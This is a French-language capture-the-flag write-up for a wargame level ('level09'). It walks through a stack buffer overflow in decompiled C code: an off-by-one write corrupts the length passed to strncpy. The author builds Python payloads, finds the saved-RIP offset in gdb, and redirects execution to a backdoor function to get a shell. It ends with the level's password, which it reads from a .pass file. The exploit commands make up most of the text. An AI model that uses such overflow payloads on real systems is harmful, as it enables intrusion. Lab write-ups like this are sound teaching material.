Dans les sources:

char v1[140]
...
set_username((__int64)v1);
set_msg((__int64)v1);

int set_username(__int64 a1) {
  char s[140];
  int i;
...
  fgets(s, 128, stdin);
  for ( i = 0; i <= 40 && s[i]; ++i )
    *(_BYTE *)(a1 + i + 140) = s[i];
  return printf(">: Welcome, %s", (const char *)(a1 + 140));
}
# set_username ecrit 41 char de s (notre inputed username) dans &v1[140] (ca crash pas, aucune idee de pourquoi mais c'est pas le sujet)

char *set_msg(__int64 a1) {
  char s[1024];
...
  fgets(s, 1024, stdin);
  return strncpy((char *)a1, s, *(int *)(a1 + 180));
}
# set_msg ecrit avec strncpy() a1[180] ***(explications en bas) char de s (notre inputed msg) dans &a1[0], on fait overflow et on recupere l'adresse actuelle de EIP (ici plus EIP car on est en 64 bits, ca devient RIP et on recupere notamment le saved rip avec info frame, on aura notre offset de cette maniere)

# *** -> (converti en int donc si a1[180] == 0xFF alors strncpy ecrit 0xFF000000 en supposant que les 3 bytes suivant a1[180] soient des 0, mais peu importe ce qu'ils sont car notre but est juste d'ecrire beaucoup pour overflow)

# bash:
	> python -c "print 'A'*40 + '\xff\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A'" > /tmp/payload09

# gdb:
	> r < <(cat /tmp/payload09)
<<< Segfault...
	> info frame
<<< ...
<<< saved rip 0x4138674137674136
<<< ...

0x4138674137674136 = offset a 200

On a une belle fonction secret_backdoor() qui appelle system() avec notre input, on va rediriger RIP vers secret_backdoor()
	> p secret_backdoor
<<< ... 0x55555555488c <secret_backdoor> (on rajoute 0000 pour ecrire 64 bits)

On build notre payload:
	> python -c "print 'A'*40 + '\xff\n' + 'A'*200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1]" > /tmp/payload09
	> cat /tmp/payload09 - | ./level09
	> /bin/sh
	> cat /home/users/end/.pass
<<< j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE